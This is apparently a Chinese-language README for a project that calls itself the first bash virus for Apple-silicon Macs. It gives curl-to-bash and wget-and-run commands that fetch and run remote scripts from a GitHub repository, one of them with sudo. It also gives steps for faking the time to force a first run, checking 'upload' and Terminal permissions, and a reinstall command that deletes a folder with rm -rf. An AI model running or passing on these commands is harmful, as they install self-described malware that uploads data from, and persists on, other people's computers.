#史上第一款，MacOS M系列病毒，100%纯bash（需要手动给予权限/nclick exploit）#

首次设置
---
`sudo curl -fsSL https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/humaninter.sh | bash`

一键启动
---
`wget https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/init-main.sh && sh init-main.sh`

(一键启动之后建议先CTRL+C然后把~/programfiles/time.txt文件vim一下往后调3个小时，让他先强制运行一遍，确认上传+权限Terminal已经给好。然后重启电脑，确认DL.app也拥有相应权限。之后建议把Time再改回来然后直接重启。）

一键启动如果出现无法启动，没有下载完全等bug请用一下指令修复

`sudo rm -rf ~/programfiles && wget https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/init-main.sh && sh init-main.sh`